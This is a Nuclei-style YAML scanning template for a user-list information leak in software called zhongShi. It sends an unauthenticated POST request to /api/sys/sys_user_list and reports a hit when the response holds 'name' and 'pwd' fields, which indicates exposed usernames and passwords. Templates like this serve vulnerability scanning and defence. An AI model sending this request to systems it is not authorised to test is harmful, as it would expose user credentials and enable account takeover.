id: zhongShi-sys_user_list-InfoLeak

info:
  name: zhongShi-sys_user_list-InfoLeak
  author: iSee857
  severity: high
  description: |
    zhongShi-sys_user_list-InfoLeak

http:
  - raw:
      - |
        POST /api/sys/sys_user_list?userName=admin HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"page":1,"limit":10,"username":""}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "Ok!"
          - "name"
          - "pwd"
        condition: and

      - type: status
        status:
          - 200